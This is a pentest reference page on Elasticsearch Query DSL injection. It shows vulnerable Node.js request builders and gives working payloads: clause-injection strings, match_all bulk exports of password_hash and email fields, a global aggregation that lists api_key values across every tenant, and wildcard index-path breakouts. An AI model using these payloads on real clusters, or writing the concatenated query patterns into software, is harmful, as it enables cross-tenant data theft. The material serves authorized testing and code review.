---
title: "Elasticsearch Query DSL injection in the JSON request body"
description: "When user input is concatenated into the JSON Query DSL or spread into a bool clause, an attacker injects should/must_not clauses or replaces the query to read documents outside intended scope."
keywords:
  - Query DSL injection
  - bool query
  - should clause
  - must_not
  - JSON injection
  - Elasticsearch
---

# Query DSL injection

The Query DSL is Elasticsearch's structured JSON query language. Injection here is not about Lucene operators inside a string; it is about controlling the **structure** of the JSON body. When an application builds the request by string-concatenating user input into a JSON template, or by spreading parsed request JSON directly into a `bool` clause, an attacker supplies extra clauses or replaces the query object, broadening or redirecting the search past the filters the application intended to enforce.

> **Scope.** For authorized penetration tests, CTF labs, and code review of systems you own or are contracted to assess.

## Vulnerable pattern: string concatenation

```js
const body = `{
  "query": {
    "bool": {
      "must": [ { "match": { "title": "${userInput}" } } ],
      "filter": [ { "term": { "tenant": "acme" } } ]
    }
  }
}`;
```

Because `userInput` lands inside raw JSON text, a crafted value closes the `match` object and injects sibling clauses. Input:

```
x" } } ], "should": [ { "exists": { "field": "ssn" } } ], "must_not": [ { "term": { "tenant": "acme"
```

adds sibling `should` and `must_not` clauses of the attacker's choosing. Any `filter` clause that still sits in the template after the injection point is AND-ed and keeps applying, so neutralizing a fixed tenant `filter` depends on an injection that can restructure past it (see "Replacing the query entirely"). Where it cannot, clause injection reshapes or narrows results within the caller's scope rather than escaping it.

## Vulnerable pattern: JSON spread into bool

```js
// req.body.filters is attacker-controlled JSON
const body = {
  query: { bool: { must: [ ...req.body.filters ],
                   filter: [ { term: { tenant: "acme" } } ] } }
};
```

Here no string parsing is needed; the attacker submits well-formed clause objects.

## What clause injection into `must` can and cannot do

Elasticsearch combines `must` and `filter` with logical **AND**. When the tenant scope sits in a fixed `filter`, clauses added to `must` are AND-ed on top, so a `match_all` does not widen the result:

```json
{ "filters": [ { "match_all": {} } ] }
```

still returns only the caller's tenant, because the `filter` term survives. A `should` placed beside a `must`/`filter` only affects scoring unless `minimum_should_match` is set and no `must`/`filter` is present.

Scope bypass therefore depends on **where** the injection lands. It works when the injection reaches the query root (replace the whole query, below) or a position that controls the `filter` array itself. When the attacker clause is merely AND-ed under a fixed `filter`, the practical results are narrowing, resource-heavy clauses (`regexp`, deep `script`), and scoring games, not cross-tenant reads.

## Replacing the query entirely

When the injection point sits at the top of the body, the cleanest result is to overwrite the whole `query` object:

```json
{ "query": { "match_all": {} }, "size": 10000 }
```

Pairing `match_all` with a large `size`, or with `_source` field selection, turns a scoped lookup into a bulk export:

```json
{ "query": { "match_all": {} }, "_source": ["password_hash","email"], "size": 5000 }
```

## Pivoting through aggregations

A normal aggregation runs over the documents the query matched, so a fixed tenant query or filter also scopes it. To read across the whole index, wrap the aggregation in a `global` bucket, which ignores the query scope:

```json
{ "size": 0, "aggs": {
    "everything": { "global": {}, "aggs": {
      "leak": { "terms": { "field": "api_key.keyword", "size": 1000 } } } } } }
```

The `global` aggregation escapes the query, so the inner `terms` enumerates high-cardinality secret-bearing fields across every document, not just the caller's.

## Multi-index breakout

Where the target index is built from input (`/${idx}/_search`), injecting a wildcard or comma-listed index reaches data stores the caller should not see:

```
_all/_search
*,-/_search
tenant-acme,tenant-globex/_search
```

The tell for all of these is any request body or index path assembled from user input without a typed builder: field values, clause objects, or index names that are never constrained to an allow-list.

## References

- [Elasticsearch: Query DSL](https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl.html)
- [Elasticsearch: Boolean query](https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-bool-query.html)
- [PayloadsAllTheThings: NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
